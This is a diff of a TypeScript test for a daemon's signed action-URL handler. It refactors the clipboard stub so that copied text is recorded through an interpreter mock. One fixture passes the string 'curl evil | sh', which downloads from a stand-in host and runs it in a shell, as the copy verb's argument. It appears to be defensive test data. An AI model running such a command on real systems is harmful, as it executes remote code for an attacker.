@@ -13,9 +13,7 @@ import { URL_FRAME_VERSION } from "../src/daemon/foundations/protocol";
 import { instantOf } from "../src/utils/instant";
 import { systemTimekeeper } from "../src/time";
 import { clickParts } from "./helpers/click-parts";
-import type { LaunchResult } from "../src/proc/launcher";
-import { testVerbContext,
-  verbContextWith } from "./helpers/click";
+import { testVerbContext } from "./helpers/click";
 import { TEST_SIGNER } from "./helpers/link-signer";
 
 const COPY = effectsUrl([{ verb: VERB_COPY, args: ["curl evil | sh"] }]);
@@ -36,14 +34,7 @@ function host(copying: Promise<void> = Promise.resolve()) {
     clientGone: _c,
     latest: _l,
     ...verbCtx
-  } = verbContextWith(testVerbContext(new SessionState()), {
-    // The clipboard, as the copy verb writes it.
-    launch: async (opts: { stdinInput?: string }) => {
-      await copying;
-      copied.push(opts.stdinInput ?? "");
-      return { ok: true, stdout: "", stderr: "", exitCode: 0 } as LaunchResult;
-    }
-});
+  } = testVerbContext(new SessionState());
   const events: string[] = [];
   const parts = {
     clock: systemTimekeeper,
@@ -52,7 +43,18 @@ function host(copying: Promise<void> = Promise.resolve()) {
     frameFeeds: { latest: () => null },
     handlerProbes: new ProbeArrivals(),
     log: (_level: string, line: string) => events.push(line),
-    ...clickParts(verbCtx, idle),
+    ...clickParts(verbCtx, idle, undefined, {
+      // The clipboard, as the host's copy writes it.
+      interpreter: {
+        perform: async (act) => {
+          await copying;
+          if (act.kind === "copy") copied.push(act.text);
+          return { kind: "ok" };
+        },
+        endsInTurn: () => true,
+      },
+      unseen: () => {},
+    }),
   } as unknown as DaemonParts;
   const frame = async (url: string, urlV = URL_FRAME_VERSION) => {
     const handled = await handleRequest(
